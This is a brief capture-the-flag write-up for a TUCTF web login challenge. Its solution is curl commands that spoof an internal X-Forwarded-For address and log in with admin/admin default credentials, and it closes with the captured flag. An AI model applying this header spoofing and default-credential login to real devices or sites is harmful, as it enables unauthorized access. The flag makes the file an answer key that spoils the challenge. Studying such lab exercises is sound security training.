#### Challenge:

Interesting login page, think you can crack it?

[chal.tuctf.com:30006](http://chal.tuctf.com:30006)

---

#### Solution:

```bash
curl http://chal.tuctf.com:30006/0.html
curl http://chal.tuctf.com:30006/1.html
curl http://chal.tuctf.com:30006/2.html

curl 'http://chal.tuctf.com:30006/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'x-forwarded-for: 192.168.1.254' -H 'Referer: http://chal.tuctf.com:30006/2.html' --data 'prot=http%3A&server=chal.tuctf.com%3A30006&authType=init&challengeCookie=&user=admin&passwd=admin&challengePwd=&ok=Log+In'
```

---

<details><summary>FLAG:</summary>

```
TUCTF{y0u_f0und_th3_fun_r0ut3r_d3f4ult5}
```

</details>
<br/>
